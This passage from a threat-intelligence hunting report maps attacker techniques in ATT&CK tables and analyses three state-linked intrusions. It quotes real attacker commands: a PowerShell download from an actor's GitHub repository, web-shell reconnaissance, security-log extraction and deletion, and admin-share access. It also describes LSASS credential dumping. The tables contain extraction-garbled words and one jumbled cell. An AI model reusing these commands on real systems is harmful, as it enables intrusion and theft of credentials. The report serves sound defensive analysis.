Genera6on Algorithms|||\n||||Fallback Channels|||\n||||Mul6-Stage Channels|||\n||||Mul6band Communica6on|||\n||||Port Knocking|||\n\n\n-----\n\n###### COMPARING TTPS BETWEEN eCRIME AND STATE-SPONSORED ADVERSARIES\n\nFigure 12 shows the overlap and divergence in techniques used by eCrime and statesponsored adversaries in interactive intrusions the first half of 2020. The table only\nreflects those intrusions where attribution was possible, and therefore not all of the\ntechniques represented in Figure 11 are reflected in Figure 12.\n\nThe divergence in initial access techniques is indicative of one of the key differences\nbetween eCrime and state-sponsored adversaries. The former are more inclined\ntoward opportunistic activity, whereas the latter are more likely to methodically pursue\na specific target. Figure 12 illustrates state-sponsored adversaries’ willingness to\nplay the long game to gain access to a target environment — for example, through\nthe calculated use of social engineering to conduct spear-phishing via a service. It is\nalso evident in the premeditation that goes into a supply chain compromise or gaining\naccess via a trusted relationship.\n\nThe differences between these two threat types are also evident when looking\nat the impact of intrusions. The financial motivations of eCrime actors are clearly\ndemonstrated, with ransomware and cryptocurrency-mining techniques being\nattributed only to this category of actors in the intrusions observed by OverWatch.\nOn the other hand, the runtime data manipulation technique is only attributed to\nstate-sponsored adversaries. Techniques that impact the integrity of enterprise data\nare much more akin to traditional state-sponsored espionage activity and are more\ndifficult to monetize for financially motivated adversaries.\n\nDespite these differences, the core trend is the commonality in techniques employed\nbetween these two threat types. CrowdStrike has previously reported on the\nblurring of lines between eCrime and state-sponsored activity, and this is illustrated\nby Figure 12. Today’s eCrime groups operate like businesses, always looking for\nopportunities to adapt to circumvent new security measures, or to innovate to boost\ntheir profit margins. No firm in any industry should consider themselves immune\nfrom sophisticated or persistent cyber threats — regardless of whether they consider\neCrime or state-sponsored adversaries to be their bigger threat.\n\n\n-----\n\n**Figure 12: A comparison of the TTPs used by state-sponsored and eCrime actors in interactive intrusions**\n**tracked by OverWatch, January-June 2020**\n\n|Ini$al Access|Execu$on|Persistence|Privilege Escala$on|Defense Evasion|Creden$al Access|\n|---|---|---|---|---|---|\n|Exploit Public-Facing Applica3on|Command-Line Interface|Accessibility Features|Access Token Manipula3on|Access Token Manipula3on|Account Manipula3on|\n|External Remote Services|Graphical User Interface|Account Manipula3on|Accessibility Features|BITS Jobs|Bash History|\n|Spearphishing AMachment|Local Job Scheduling|BITS Jobs|Bypass User Account Control|Bypass User Account Control|Brute Force|\n|Valid Accounts|PowerShell|Create Account|Exploita3on for Privilege Escala3on|Clear Command History|Creden3al Dumping|\n|Spearphishing via Service|Regsvr32|External Remote Services|New Service|Compile AUer Delivery|Creden3als from Web Browsers|\n|Supply Chain Compromise|Rundll32|Hidden Files and Directories|Process Injec3on|Connec3on Proxy|Creden3als in Files|\n|Trusted Rela3onship|Scheduled Task|Local Job Scheduling|Scheduled Task|Deobfuscate/Decode Files or Informa3on|Creden3als in Registry|\n|Drive-by Compromise|Scrip3ng|Modify Exis3ng Service|Valid Accounts|Disabling Security Tools|Input Capture|\n|Hardware Addi3ons|Service Execu3on|New Service|Web Shell|DLL Side-Loading|Kerberoas3ng|\n|Replica3on Through Removable Media|User Execu3on|Registry Run Keys / Startup Folder|AppInit DLLs|Exploita3on for Defense Evasion|Private Keys|\n|Spearphishing Link|Windows Management Instrumenta3on|Scheduled Task|DLL Search Order Hijacking|File and Directory Permissions Modifica3on|Steal Web Session Cookie|\n|C Do ism trp ibo un te en dt C O Ob Mject Model and Valid Accounts Service Registry Permissions Weakness Execu3on through API Web Shell Setuid and Setgid Exploita3on for Client Execu3on .bash_profile and .bashrc Sudo InstallU3l AppInit DLLs Image File Execu3on Op3ons Injec3on Execu3on through Module Load DLL Search Order Hijacking AppCert DLLs Mshta Redundant Access Applica3on Shimming Regsvcs/Regasm Service Registry Permissions Weakness Dylib Hijacking Third-party SoUware Setuid and Setgid Elevated Execu3on with Prompt Trusted Developer U3li3es W Evi en nd to Sw us b sM cra in pa 3g oe nment Instrumenta3on Emond AppleScript Image File Execu3on Op3ons Injec3on Extra Window Memory Injec3on CMSTP Netsh Helper DLL File System Permissions Weakness Compiled HTML File Screensaver Hooking Control Panel Items AppCert DLLs Launch Daemon Dynamic Data Exchange Applica3on Shimming Parent PID Spoofing Launchctl Authen3ca3on Package Path Intercep3on LSASS Driver Bootkit Plist Modifica3on Signed Binary Proxy Execu3on Browser Extensions Port Monitors Signed Script Proxy Execu3on Change Default File Associa3on PowerShell Profile Source Component Firmware SID-History Injec3on Space aUer Filename Component Object Model Hijacking Startup Items Trap Dylib Hijacking Sudo Caching Windows Remote Management Emond XSL Script Processing File System Permissions Weakness Hooking Hypervisor Kernel Modules and Extensions Launch Agent Launch Daemon Launchctl LC_LOAD_DYLIB Addi3on Login Item Logon Scripts LSASS Driver Office Applica3on Startup Path Intercep3on Plist Modifica3on Port Knocking Port Monitors PowerShell Profile Rc.common Re-opened Applica3ons Security Support Provider Server SoUware Component Shortcut Modifica3on SIP and Trust Provider Hijacking Startup Items System Firmware Systemd Service Time Providers Trap Winlogon Helper DLL eCrime only State-sponsored only|Component Object Model and Distributed COM|Valid Accounts|Service Registry Permissions Weakness|File Dele3on|Network Sniffing|\n||Execu3on through API|Web Shell|Setuid and Setgid|Hidden Files and Directories|Exploita3on for Creden3al Access|\n||Exploita3on for Client Execu3on|.bash_profile and .bashrc|Sudo|Hidden Window|Forced Authen3ca3on|\n||InstallU3l|AppInit DLLs|Image File Execu3on Op3ons Injec3on|Indicator Removal on Host|Hooking|\n||Execu3on through Module Load|DLL Search Order Hijacking|AppCert DLLs|Masquerading|Input Prompt|\n||Mshta|Redundant Access|Applica3on Shimming|Modify Registry|Keychain|\n||Regsvcs/Regasm|Service Registry Permissions Weakness|Dylib Hijacking|Network Share Connec3on Removal|LLMNR/NBT-NS Poisoning and Relay|\n||Third-party SoUware|Setuid and Setgid|Elevated Execu3on with Prompt|Obfuscated Files or Informa3on|Password Filter DLL|\n||Trusted Developer U3li3es|Windows Management Instrumenta3on Event Subscrip3on|Emond|Process Hollowing|Securityd Memory|\n||AppleScript|Image File Execu3on Op3ons Injec3on|Extra Window Memory Injec3on|Process Injec3on|Two-Factor Authen3ca3on Intercep3on|\n||CMSTP|Netsh Helper DLL|File System Permissions Weakness|Regsvr32||\n||Compiled HTML File|Screensaver|Hooking|Rundll32||\n||Control Panel Items|AppCert DLLs|Launch Daemon|Scrip3ng||\n||Dynamic Data Exchange|Applica3on Shimming|Parent PID Spoofing|Timestomp||\n||Launchctl|Authen3ca3on Package|Path Intercep3on|Valid Accounts||\n||LSASS Driver|Bootkit|Plist Modifica3on|Code Signing||\n||Signed Binary Proxy Execu3on|Browser Extensions|Port Monitors|DLL Search Order Hijacking||\n||Signed Script Proxy Execu3on|Change Default File Associa3on|PowerShell Profile|HISTCONTROL||\n||Source|Component Firmware|SID-History Injec3on|Indicator Removal from Tools||\n||Space aUer Filename|Component Object Model Hijacking|Startup Items|InstallU3l||\n||Trap|Dylib Hijacking|Sudo Caching|Redundant Access||\n||Windows Remote Management|Emond||Rootkit||\n||XSL Script Processing|File System Permissions Weakness||Template Injec3on||\n|||Hooking||Web Service||\n|||Hypervisor||Group Policy Modifica3on||\n|||Kernel Modules and Extensions||Hidden Users||\n|||Launch Agent||Image File Execu3on Op3ons Injec3on||\n|||Launch Daemon||Mshta||\n|||Launchctl||NTFS File AMributes||\n|||LC_LOAD_DYLIB Addi3on||Regsvcs/Regasm||\n|||Login Item||SoUware Packing||\n|||Logon Scripts||Trusted Developer U3li3es||\n|||LSASS Driver||Binary Padding||\n|||Office Applica3on Startup||CMSTP||\n|||Path Intercep3on||Compiled HTML File||\n|||Plist Modifica3on||Component Firmware||\n|||Port Knocking||Component Object Model Hijacking||\n|||Port Monitors||Control Panel Items||\n|||PowerShell Profile||DCShadow||\n|||Rc.common||Execu3on Guardrails||\n|||Re-opened Applica3ons||Extra Window Memory Injec3on||\n|||Security Support Provider||File System Logical Offsets||\n|||Server SoUware Component||Gatekeeper Bypass||\n|||Shortcut Modifica3on||Indicator Blocking||\n|||SIP and Trust Provider Hijacking||Indirect Command Execu3on||\n|||Startup Items||Install Root Cer3ficate||\n|||System Firmware||Launchctl||\n|||Systemd Service||LC_MAIN Hijacking||\n|||Time Providers||Parent PID Spoofing||\n|||Trap||Plist Modifica3on||\n|||Winlogon Helper DLL||Port Knocking||\n|||||Process Doppelgänging||\n|||||Signed Binary Proxy Execu3on||\n|||||Signed Script Proxy Execu3on||\n|||||SIP and Trust Provider Hijacking||\n|||||Space aUer Filename||\n|||||Virtualiza3on/Sandbox Evasion||\n|||||XSL Script Processing||\n\n\nBoth\n\n\n-----\n\n|Discovery|Lateral Movement|Collec$on|Command And Control|Exfiltra$on|Impact|\n|---|---|---|---|---|---|\n|Account Discovery|Remote Desktop Protocol|Data from Informa3on Repositories|Commonly Used Port|Data Compressed|Service Stop|\n|Domain Trust Discovery|Remote File Copy|Data from Local System|Connec3on Proxy|Data Encrypted|System Shutdown/Reboot|\n|File and Directory Discovery|Remote Services|Data from Network Shared Drive|Custom Command and Control Protocol|Exfiltra3on Over Alterna3ve Protocol|Run3me Data Manipula3on|\n|Network Service Scanning|Windows Admin Shares|Data Staged|Data Obfusca3on|Exfiltra3on Over Command and Control Channel|Data Encrypted for Impact|\n|Network Share Discovery|Component Object Model and Distributed COM|Input Capture|Remote Access Tools|Automated Exfiltra3on|Inhibit System Recovery|\n|Password Policy Discovery|Pass the Hash|Screen Capture|Remote File Copy|Data Transfer Size Limits|Resource Hijacking|\n|Permission Groups Discovery|Third-party SoUware|Automated Collec3on|Standard Applica3on Layer Protocol|Exfiltra3on Over Other Network Medium|Account Access Removal|\n|Process Discovery|AppleScript|Clipboard Data|Standard Cryptographic Protocol|Exfiltra3on Over Physical Medium|Data Destruc3on|\n|Query Registry|Applica3on Deployment SoUware|Audio Capture|Uncommonly Used Port|Scheduled Transfer|Defacement|\n|Remote System Discovery|Exploita3on of Remote Services|Data from Removable Media|Data Encoding||Disk Content Wipe|\n|Security SoUware Discovery|Internal Spearphishing|Email Collec3on|Standard Non-Applica3on Layer Protocol||Disk Structure Wipe|\n|System Informa3on Discovery|Logon Scripts|Man in the Browser|Web Service||Endpoint Denial of Service|\n|System Network Configura3on Discovery|Pass the Ticket|Video Capture|Communica3on Through Removable Media||Firmware Corrup3on|\n|System Network Connec3ons Discovery|Replica3on Through Removable Media||Custom Cryptographic Protocol||Network Denial of Service|\n|System Owner/User Discovery|Shared Webroot||Domain Fron3ng||Stored Data Manipula3on|\n|System Service Discovery|SSH Hijacking||Domain Genera3on Algorithms||TransmiMed Data Manipula3on|\n|System Time Discovery|Taint Shared Content||Fallback Channels|||\n|Network Sniffing|Windows Remote Management||Mul3-hop Proxy|||\n|Peripheral Device Discovery|||Mul3-Stage Channels|||\n|SoUware Discovery|||Mul3band Communica3on|||\n|Applica3on Window Discovery|||Mul3layer Encryp3on|||\n|Browser Bookmark Discovery|||Port Knocking|||\n|Virtualiza3on/Sandbox Evasion||||||\n\n\n-----\n\n#### INTRUSION HIGHLIGHTS\n\n###### HUNTING THWARTS LABYRINTH CHOLLIMA ATTACK LAUNCHED OVER SOCIAL MEDIA\n\n OVERVIEW\n\nIn June 2020, OverWatch hunting uncovered a notable attack against a North American\nagriculture company. A phishing lure led to installation of a malicious loader, which\nprovided access for a hands-on operator to perform various discovery commands on\nthe target system. While the agriculture sector has had its share of eCrime intrusions,\nstate-sponsored adversaries have also turned their attention to this industry. In\nthis case, CrowdStrike Intelligence attributed the activity to the North Korea-based\nadversary group LABYRINTH CHOLLIMA.\n\n\n-----\n\n###### UNUSUAL COMMAND ALERTS THREAT HUNTERS TO MALICIOUS ACTIVITY\n\nOverWatch identified suspicious behavior within this agriculture company’s network\nwhen an unusual rundll32.exe command was executed under a Microsoft\nWord process. A suspicious dynamic link library (DLL) file named desktop.dat,\nmasquerading as a .dat file, was loaded into memory in an unusual manner. Shortly\nthereafter, OverWatch hunters observed several interactive command shells spawned\nunder the rundll32.exe process responsible for executing the DLL.\n\n**Figure 13: Example process tree of a cmd.exe shell spawned under the suspicious**\nrundll32.exe process\n\nWINLOGON.EXE\n\nUSERINIT.EXE\n\nEXPLORER.EXE\n\nCHROME.EXE\n\nWINWORD.EXE\n\nRUNDLL32.EXE\n\nCMD.EXE\n\nThese cmd shells were used to execute a range of discovery commands to gather\nnetwork, host and account information. For example:\n\n- ipconfig /all\n\n- net use\n\n- ping -n 1 -a <REDACTED HOSTNAME>\n\n- ping -n 1 <REDACTED HOSTNAME>\n\n- cmd.exe /c time /t\n\n- netstat -ano\n\n- reg query \"HKEY_USERS\\[REDACTED SID]\\Software\\Microsoft\\\nWindows\\CurrentVersion\\Internet Settings\"\n\n- net localgroup administrators\n\n- net group \"domain admins\" /domain\n\n- sc query\n\nOverWatch immediately notified the customer of the potentially malicious behavior\nvia Falcon console detections and provided a detailed written report. With the victim\nequipped to take defensive action, OverWatch threat hunters then continued in their\ninvestigation.\n\n\n-----\n\n###### UNSOLICITED JOB OPPORTUNITY PROVES TO BE TOO GOOD TO BE TRUE\n\nFurther analysis of the attack, in tandem with the CrowdStrike Intelligence team,\nuncovered evidence that the attack began when a user unwittingly opened a\nweaponized Microsoft Word document. The adversary, posing as a job recruiter, used\nvarious social media channels and applications to facilitate delivery of the phishing\nlure. When opened, the file downloaded a macro-enabled document hosted at a\nmalicious URL. The macro-enabled document was then downloaded as an embedded\ntemplate. The downloaded template file contained a macro that, when executed,\nextracted a double Base64-encoded payload saved to the path\nC:\\ProgramData\\desktop.dat. This was the DLL file disguised as a .dat file that\ncaught OverWatch’s attention, as noted previously. The DLL exports many functions\ncomposed mainly of Perl Compatible Regular Expressions (PCRE) library functions\nin an attempt to masquerade the DLL as a benign file. But the DLL also decrypted a\ncopy of a payload that CrowdStrike Intelligence refers to as “NedDnLoader,” which\nwas then loaded directly into memory. Abusing rundll32.exe to execute DLLs puts\nnetwork defenders in a difficult position when relying on security technologies alone.\nRather than configuring the endpoint security platform to block rundll32.exe,\nand potentially causing impact to normal network operations, defenders can employ\neffective threat hunting to serve as the backstop to identify such living-off-the-land\ntechniques.\n\nThe NedDnLoader payload then attempted to contact a command and control (C2)\nserver to retrieve a second-stage payload from the following URL:\n\nhttps[:]//www.paghera[.]com/include/inc-main-default-news.asp.\n\nIn addition to loading the NedDnLoader payload, the macro displayed a spoofed\nEnglish-language decoy job description for a Senior Manager position on the finance\nteam at a legitimate entertainment company.\n\nThis enabled the adversary to achieve interactive access to the compromised host\nand perform the initial discovery actions mentioned previously. During this time, they\nalso created a new directory on the system, masquerading as a legitimate Windows\ndirectory, and used xcopy to copy folders and files over to the new directory,\npotentially as staging for later exfiltration:\n\nxcopy /S /C /E C:\\ProgramData\\Microsoft\\Windows\\*.*\nC:\\ProgramData\\Windows\n\n\n-----\n\n###### CONCLUSIONS AND RECOMMENDATIONS\n\nThanks to OverWatch’s rapid identification and communication of the attack, the\ncustomer was able to network contain the machine to stop the adversary and prevent\nany significant impact. Subsequent investigation found that the adversary had used a\nfalsified profile on one social media channel to initiate contact with the victim, and then\nused that relationship to deceive the victim into opening the malicious file when it was\ndelivered via a separate messaging application. This serves as an important reminder\nfor defenders to continuously evaluate the appropriate level of filtering for web-based\ncontent for their users. In many cases, restricting access to sites like social media\nplatforms would reduce the attack surface available to adversaries. In addition, users\nshould be regularly reminded and trained in identifying social engineering techniques.\n\nCrowdStrike Intelligence assesses with high confidence that this operation is\nattributable to LABYRINTH CHOLLIMA based on the deployment of NedDnLoader\n— malware exclusive to this adversary — as well as the use of job description lure\ndocuments (a frequent LABYRINTH CHOLLIMA tactic). Also worth highlighting is\nthat the decoy content initially appears to be tailored to media or financial sector\nentities and does not appear specific to the agriculture industry. While this targeting\ncould be indicative of economic espionage targeting the agricultural sector — a\nvertical highlighted for aggressive economic development by Kim Jong-un in his 2016\nNational Economic Development Strategy (NEDS) — LABYRINTH CHOLLIMA is also\nknown to use compromised infrastructure in its campaigns. It is equally likely that the\nunfocused nature of the decoy document could be a generic lure used by LABYRINTH\nCHOLLIMA to obtain access to the targeted customer’s infrastructure, which would\nsubsequently be leveraged by LABYRINTH CHOLLIMA as C2 or to host secondary\npayloads in follow-on operations.\n\n\n-----\n\n###### PANDA ABUSES GITHUB SERVICE FOR COVERT C2\n\n OVERVIEW\n\nIn June 2020, Falcon OverWatch uncovered targeted intrusion activity against an\norganization operating within the healthcare industry in the Asia-Pacific region. The\npreexisting intrusion predated the organization’s deployment of the Falcon sensor and\ninvolved the use of a number of interesting TTPs to support the actor’s actions on\nobjectives, which included information-gathering operations and establishing persistent\naccess. The malicious activity shared a strong overlap with TTPs previously observed in\ntargeted intrusions against healthcare organizations throughout Southeast Asia, and the\nTTPs observed are consistent with China-based adversaries.\n\nInitial malicious activity included the attempted execution of China Chopper — a web\nshell commonly used by China-nexus threat actors — beneath a likely exploited Apache\nweb server process on a Windows-based host, along with the use of PowerShell to\ndownload and retrieve a malicious executable. Particularly noteworthy was the actor’s\nuse of a novel Python-based remote access tool (RAT) masquerading as a legitimate\nWindows system process that leverages a public GitHub repository for covert C2\ncommunications. A second actor-controlled GitHub repository was also identified being\nused to stage a selection of malicious tooling and password-protected .zip archives,\nwhich included two variants of an EternalBlue exploit scanner. Also notable was the\nactor’s querying and subsequent extraction of user logon events from the security\nevent log on a likely Windows domain controller, in which the command line utility\nwevtutil.exe was used to display events associated with a single user account of\ninterest, before exporting and archiving the events in preparation for likely exfiltration.\n\n\n-----\n\n###### ATTEMPTED CHOPPER WEB SHELL EXECUTION BENEATH APACHE WEB PROCESS\n\nAs part of this preexisting intrusion, Falcon OverWatch identified attempts by the actor\nto execute the China Chopper web shell beneath the likely exploited Apache web\nserver process httpd.exe. Operating as the local system user, the actor attempted\nto use the web shell to gather system information through the execution of basic host\nreconnaissance commands.\n\nExample:\n\ncmd.exe /c \"cmd /c \"cd /d \"C:/www/[REDACTED]/[REDACTED]/system/\ncore\"&whoami&echo [S]&cd&echo [E]\" 2>&1\"\n\n**Figure 14: Example process tree showing likely compromised httpd.exe spawning**\n**multiple command shells**\n\nWININIT.EXE\n\nSERVICES.EXE\n\nHTTPD.EXE\n\nCMD.EXE\nHTTPD.EXE\n\nCMD.EXE\n\nCMD.EXE\n\nIn this case, the actor’s attempts to execute the China Chopper web shell were thwarted\nby the Falcon sensor and were ultimately unsuccessful.\n\n###### PYTHON RAT LEVERAGES GITHUB FOR COVERT C2\n\nFurther investigation into the actor’s activity by OverWatch threat hunters uncovered\nthe existence of a preexisting implant binary in the C:\\Windows directory on a\nhost. The binary was masquerading as the Microsoft shared service host process\nsvchost.exe in an attempt to evade detection and bypass security controls. Analysis\nof the implant, dubbed “BackGitHub” by CrowdStrike Intelligence, revealed that the\nbinary was in fact a PyInstaller executable containing a novel Python-based RAT.\nNotably, the implant binary was found to be resolving the domain api.github.com\nand had the capability to execute arbitrary commands via API, using an actor-controlled\nGitHub repository for covert C2 communications.\n\nAlso notably, further analysis of the GitHub repository revealed a list of both the\nimplant commands executed by the actor, and the responses to commands and\nbeacons. The commands were reflective of basic host reconnaissance operations and\nincluded enumeration of both directories and group memberships of interest.\n\n|t.ex|e in an|\n|---|---|\n\n\n-----\n\nReconnaissance command execution examples:\n\ndir c:\\users\\public\\\nsysteminfo\nping -a -n 1 [REDACTED]\nipconfig /all\nwhoami\nnet user /domain\n\n###### ALTERNATE GITHUB REPOSITORY USED TO STAGE MALICIOUS TOOLING\n\nContinuing to operate via the implant svchost.exe, the actor attempted to launch\nPowerShell to download the malicious binary ms.exe from a second actor-controlled\npublic GitHub repository. The specific binary in question was later identified by\nCrowdStrike Intelligence as an EternalBlue exploit scanning tool, commonly deployed\nby adversaries in an attempt to locate hosts that remain vulnerable to the Windows\nSMBv1 remote code execution vulnerability CVE-2017-0143.\n\nCommand line example:\n\npowershell (new-object System.Net.WebClient).\nDownloadFile('hXXps://github[.]com/[REDACTED]/test/raw/master/\nms.exe','c:\\\\users\\\\public\\\\2.exe')\n\n**Figure 15: Example process tree shows PowerShell launched via cmd.exe beneath actor**\n**implant svchost.exe**\n\nSVCHOST.EXE\n\nCMD.EXE\n\nSVCHOST.EXE\n\nCMD.EXE\n\nPOWERSHELL.EXE\n\nCMD.EXE\n\nSYSTEMINFO.EXE\n\nFurther examination of this second GitHub repository by OverWatch revealed it was\nbeing used by the actor as a staging resource and contained a selection of malicious\nexecutables and open source penetration-testing tools, including a second variant\nof the EternalBlue scanner, a shellcode loader and a tunneling utility used to subvert\nfirewalls. Additionally, multiple password-protected .zip archive files were also\ndiscovered.\n\n\n-----\n\n###### EXTRACTION AND ARCHIVAL OF USER LOGON EVENTS FROM THE SECURITY EVENT LOG\n\nContinuing their actions on objectives, the actor was later observed conducting\ninformation-gathering operations on a second Windows host, likely serving as a\ndomain controller, in the form of targeted log event extraction and subsequent\ncompression. The activity occurred beneath the likely exploited Microsoft Spooler\nSubSystem app spoolsv.exe and was conducted via a Remote Desktop Protocol (RDP)\nsession, which was initiated from a remote internal host, without the Falcon sensor\ninstalled, using likely compromised administrative credentials.\n\n**Figure 16: Example process tree shows multiple actor command prompts launched beneath**\n**the exploited spoolsv.exe service used to execute Microsoft utilities makecab.exe and**\nwevtutil.exe\n\nWININIT.EXE\n\nSERVICES.EXE\n\nCMD.EXE\n\nSPOOLSV.EXE\n\nCMD.EXE\n\nMAKECAB.EXE\n\nCMD.EXE\n\nWEVTUTIL.EXE\n\nThe actor launched the Microsoft Windows utility wevtutil.exe with the ‘qe’ flag\nto query events of interest in the Windows security log.\n\nC:\\Windows\\system32\\cmd.exe /C wevtutil qe security /format:text\n/q:\"Event[System[(EventID=4624) and TimeCreated[timediff(@\nSystemTime) <= 432000000]] and EventData[Data[@\nName='TargetUserName']='[REDACTED]']]\" > [REDACTED].txt\n\nThe specific command execution in this case is notable and indicates that the actor\nwas focused strictly on user logon events (Event ID 4624) associated with one\nparticular user account of interest from the preceding 12 hours.\n\nThe actor then ran wevtutil.exe again, this time with the ‘epl’ flag to export all\nuser logon events from the preceding 12 hours to an .evtx output file.\n\nwevtutil epl Security C:\\system~1\\[REDACTED].evtx\n/q:\"*[System[(EventID=4624) and TimeCreated[timediff(@SystemTime)\n<= 43200000]]]\"\n\nFrom here, the actor used the makecab utility to compress the .evtx output file into\na .zip archive in preparation for likely exfiltration, after which the actor deleted the\narchive file in an attempt to cover their tracks.\n\nC:\\Windows\\system32\\cmd.exe /C del [REDACTED}.evtx.zip [REDACTED].\nevtx log.txt\n\n\n-----\n\n###### CONCLUSIONS AND RECOMMENDATIONS\n\nRecent global events continue to position the healthcare industry firmly in the\ncrosshairs as a rich target for threat actors. Despite the preexisting nature of this\nintrusion, OverWatch’s human-led continuous threat hunting allowed for the prompt\ndiscovery and notification of the malicious activity described, enabling the victim\norganization to quickly respond by containing the adversary and commencing\nremediation activities. The TTPs deployed as part of this intrusion serve as a timely\nreminder of the importance of getting the fundamentals right with respect to basic\nsecurity hygiene, including effective patch management. The increasing use of\ntechniques like masquerading as a means to conceal malicious binary execution\nwarrants defenders considering countermeasures such as allowlisting to help restrict\nprogram execution based on non-name-based file attributes. Furthermore, the use of\nweb proxies and other controls should be evaluated to assist in filtering web traffic\nand to help mitigate against adversary use of legitimate web services such as GitHub\nto facilitate and conceal C2 communications.\n\n\n-----\n\n###### TRACER KITTEN EXPLOITS CUSTOM BACKDOORS TO BREACH A TELECOMMUNICATIONS COMPANY\n\n OVERVIEW\n\nIn April 2020, OverWatch discovered Iran-based adversary TRACER\nKITTEN conducting malicious interactive activity against multiple hosts at a\ntelecommunications company in the Europe, Middle East and Africa (EMEA) region.\nThe actor was found operating under valid user accounts, using custom backdoors\nin combination with SSH tunnels for C2. The adversary leveraged their foothold to\nconduct a variety of reconnaissance activities, undertake credential harvesting and\nprepare for data exfiltration.\n\nTelecommunications is currently the third most frequently targeted vertical. This\nindustry still remains firmly within the crosshairs for targeted attacks, the motivations\nof which are likely associated with espionage and data theft objectives.\n\n###### INITIAL ACCESS EXECUTION PERSISTENCE CREDENTIAL ACCESS LATERAL MOVEMENT COLLECTION\n\nValid accounts Custom code Masquerading\ncompromised to deployed to install performed on a\ngain foothold backdoors and legitimate Bitvise SSH\n\nconfigure rogue client and subsequently\nservices used to move laterally\n\nFalcon sensor blocked Various techniques PowerShell tool\nattempts to utilize leveraged to exploit Invoke-TheHash\nPowerShell, Command LSASS, including the executed to gather and\nPrompt and WMIC to use of comsvcs.dll move files between\nperform reconnaissance mapped shares\n\n###### UNUSUAL ACTIVITY LEADS TO DISCOVERY OF LEGITIMATE SSH CLIENT BEING USED FOR LATERAL MOVEMENT\n\nThe key tactics performed by this adversary highlight various advanced hands-onkeyboard techniques, which can be extremely difficult to detect and distinguish from\nnormal traffic patterns. The adversary leveraged valid account credentials from an\nunknown source to gain an initial foothold within the environment.\n\nProactive threat hunting uncovered a masquerading technique being used, which\nled to the discovery and reporting of further malicious hands-on-keyboard activity.\nIn this instance, the adversary observed that an SSH tool called Bitvise was installed\non the system, and proceeded to take a copy of this and rename it within an Adobe\ndirectory to appear associated with the Adobe program. This application was then\nused to move laterally through the network and gain additional access, which led to\nOverWatch discovering the activity due to the program executing via an anomalous\nprocess path.\n\n\n-----\n\n###### ADVERSARY BACKDOORS MASQUERADE AS LEGITIMATE SERVICES\n\nOverWatch discovered various custom binaries being installed onto multiple machines\nwithin the environment. These binaries were attempting to evade detection by registering\nas a Windows service named “Windows Video Service.” Following analysis, it was\ndetermined that these files were being used as implants and could have allowed for\nexfiltration, but due to timely discovery and notification, the customer was able to perform\nnetwork containment before the actor was able to steal any data. The files shown below\nare the implants that were responsible for creating the rogue Windows services.\n\nC:\\Program Files (x86)\\Common Files\\Microsoft Shared\\Source\nEngine\\OSE.EXE\n\nC:\\Program Files\\Windows Identity Foundation\\v3.5\\c2wtshost.exe\n\nC:\\Program Files (x86)\\Microsoft SQL Server\\90\\Shared\\sqlbrowser.exe\n\nThe malware implants employed by the attacker were previously unidentified, but\nreverse-engineering efforts have now identified that DNS (TXT record) tunneling was\ncoded in as the C2 mechanism, along with modified Base64 and encryption using\nthe CryptoPP library. This functionality allows for several obfuscated commands to\nbe passed to the implant, some of which allow for executing shell commands and the\nreading and writing of files.\n\n###### ADVERSARY LEVERAGES NATIVE TOOLS IN CREDENTIAL HARVESTING ATTEMPT\n\nHunting efforts identified an atypical living-off-the-land technique being employed\nto exploit the LSASS process via the use of comsvcs.dll. This application is built\ninto Windows and is an example of tradecraft used by sophisticated adversaries.\nThis DLL file contains an exported function called MiniDump, which can be called via\nrundll32.exe to create a memory dump of a given process. Figure 17 highlights\nthe process chain that resulted from the adversary’s use of this technique. First,\nPowerShell was leveraged to execute a Base64-encoded command line argument.\nThe command line executed rundll32.exe and called the comsvcs.dll function\nMiniDump to export the contents of the LSASS process into an output file.\n\n**Figure 17: Example process tree of Comsvcs.dll being called via PowerShell and Rundll32**\n\nWININIT.EXE\n\nSERVICES.EXE\n\nSVCHOST.EXE\n\nPOWERSHELL.EXE\n\nWMIPRVSE.EXE\n\nRUNDLL32.EXE\n\nPOWERSHELL.EXE\n\nEVENTS.EXE\n\nFurther efforts used by the adversary to perform credential harvesting included a\ncustom version of Mimikatz being copied across to the system, and Task Manager\nbeing used to dump the LSASS process to disk. However, both of these attempts\nwere thwarted by the Falcon sensor.\n\n\n-----\n\n###### ADVERSARY TAKES ADVANTAGE OF TERMINAL SERVICES TO PERFORM RECONNAISSANCE AND ATTEMPT C2 BEACONING\n\nVarious utilities were used to execute extensive fingerprinting of the environment,\ncollect user and group information, enumerate services and perform network\nreconnaissance. Some of these tools included PowerShell, CMD command line\ninterpreter and the WMIC utility.\n\nThe adversary pivoted laterally using SSH, gained access to a domain controller and\nalso accessed internally mapped shares. From here, data was caught being moved\nbetween shares, as seen in the following commands.\n\nnet use \\\\[REDACTED]\\c$ /user:\"[REDACTED]\\Administrator\"\n\"<redacted>\";\n\ndir C:\\Programdata\\Emc >> \\\\[REDACTED]\\c$\\Programdata\\Dc.log;\n\nC:\\Programdata\\Emc\\Emc.exe [REDACTED] >> \\\\[REDACTED]\\c$\\\nProgramdata\\Dc.log;\n\nThen, the adversary attempted to run Invoke-TheHash, an application used to perform\npass-the-hash attacks. The Falcon sensor successfully blocked this activity and\nprevented communication beacons outbound to the attacker’s infrastructure through\ncontinued use of the Bitvise application.\n\n###### CONCLUSIONS AND RECOMMENDATIONS\n\nThe TTPs used by TRACER KITTEN during this intrusion speak to the importance\nof human-driven threat hunting and highlight the challenges of relying exclusively on\ntechnology-based controls. OverWatch was able to work with the affected customer\nto provide detailed and timely advice to enable them to contain and expel the\nadversary from their network and prevent any significant impact from the attack.\n\nDuring this intrusion, OverWatch identified novel techniques to exploit LSASS via the\nuse of the Windows built-in comsvcs.dll utility. Traditional reactive monitoring would\nnot alert to activity of this nature, and it is therefore important to understand what\n“normal” looks like within your environment. Threat hunting is highly recommended, as\nit is an effective approach to identifying anomalous activity such as this.\n\nFurthermore, it is recommended that authentication logs are monitored to identify any\npotential rogue use of SSH or possible password spraying of user account credentials.\nAn existing installation of a legitimate SSH client was used to move laterally by the\nattacker; CrowdStrike therefore recommends that only business-critical applications\nare installed on hosts and that all software adheres to the latest updates and security\npatches.\n\nThis intrusion highlighted the control of valid accounts, and CrowdStrike therefore\nadvocates monitoring logs for any new domain accounts and also monitoring any\naccounts that have new administrator-level privileges assigned to them. Monitoring\nnew service additions can also be of benefit, but context is required — human analysts\nwere essential in the discovery of the malicious artifacts within this customer’s\nenvironment.\n\n\n-----\n\n###### BACKDOORED SSH SERVICE USED TO COLLECT CREDENTIALS FROM A TECHNOLOGY COMPANY\n\n OVERVIEW\n\nOverWatch uncovered an intrusion during April 2020 against a technology company\nin the Asia-Pacific region in which an unknown actor compromised a Linux 